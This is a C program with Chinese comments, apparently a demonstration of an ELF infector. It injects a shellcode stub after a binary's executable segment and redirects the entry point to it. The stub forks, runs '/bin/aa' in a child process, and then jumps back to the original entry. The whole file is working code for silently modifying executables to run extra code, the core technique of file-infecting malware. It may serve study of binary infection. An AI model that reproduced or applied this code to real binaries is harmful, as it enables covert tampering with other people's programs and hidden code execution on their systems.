#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>

unsigned char stub_code[] =
				"\x48\x31\xc0"									// xor    %rax,%rax
				"\xb0\x39"										// mov    $0x39,%al
				"\x0f\x05"										// syscall
				"\x85\xc0"										// test   %eax,%eax
				"\x74\x05"										// je     40070c <__FRAME_END__+0x14>
				"\x00\x00\x00\x00\x00" // index is 11			// jmpq   400430 <_start>
				"\x49\xbb\x2f\x62\x69\x6e\x2f\x61\x61\x00"		// movabs $0x61612f6e69622f,%r11
				"\x41\x53"										// push   %r11
				"\xba\x00\x00\x00\x00"							// mov    $0x0,%edx
				"\x48\xc7\xc6\x00\x00\x00\x00"					// mov    $0x0,%rsi
				"\x48\x89\xe7"									// mov    %rsp,%rdi
				"\xb8\x3b\x00\x00\x00"							// mov    $0x3b,%eax
				"\x0f\x05";										// syscall
#define RELJMP	11

int main(int argc, char **argv)
{
	int fd, i;
	unsigned char *base;
	unsigned int size, *off, offs;
	unsigned long stub, orig;
	unsigned long clen = sizeof(stub_code);
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdrs;
    Elf64_Shdr  *shdrs;
	// 这就是一个e9 jmp rel32指令
	stub_code[RELJMP] = 0xe9;
	off = (unsigned int *)&stub_code[RELJMP + 1];

	fd = open(argv[1], O_RDWR);
	size = lseek(fd, 0, SEEK_END);
	base = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);

	ehdr = (Elf64_Ehdr *) base;
	phdrs = (Elf64_Phdr *) &base[ehdr->e_phoff];
	shdrs = (Elf64_Shdr *) &base[ehdr->e_shoff];
	orig = ehdr->e_entry;

	for (i = 0; i < ehdr->e_phnum; ++i) {
		if (phdrs[i].p_type == PT_LOAD && phdrs[i].p_flags == (PF_R|PF_X)) {
			// 这里假设只有简单的一个可执行的程序头
			stub = phdrs[i].p_vaddr + phdrs[i].p_filesz;
			ehdr->e_entry = (Elf64_Addr)stub;
			// 为了跳回原来的入口，这里需要计算相对偏移
			offs = orig - (stub + RELJMP) - 5;
			// 待定的rel32终究被赋值了
			*off = offs;

			memcpy(base + phdrs[i].p_offset + phdrs[i].p_filesz, stub_code, clen);
			printf("fsie:%d   %08x\n", phdrs[i].p_filesz, ehdr->e_entry);

			phdrs[i].p_filesz += clen;
			phdrs[i].p_memsz += clen;
			break;
		}
    }
    munmap(base, size);
}